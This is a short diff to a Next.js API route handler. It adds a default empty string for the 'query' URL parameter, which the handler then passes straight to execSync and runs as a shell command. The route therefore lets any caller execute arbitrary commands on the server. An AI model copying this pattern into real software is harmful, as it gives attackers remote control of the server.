@@ -2,7 +2,7 @@ import { NextResponse, NextRequest } from "next/server";
 import { execSync } from "child_process";
 
 async function GET(req: NextRequest) {
-  const command = req.nextUrl?.searchParams?.get("query");
+  const command = req.nextUrl?.searchParams?.get("query") || "";
 
   try{
     const output = execSync(command, { encoding: "utf-8" });
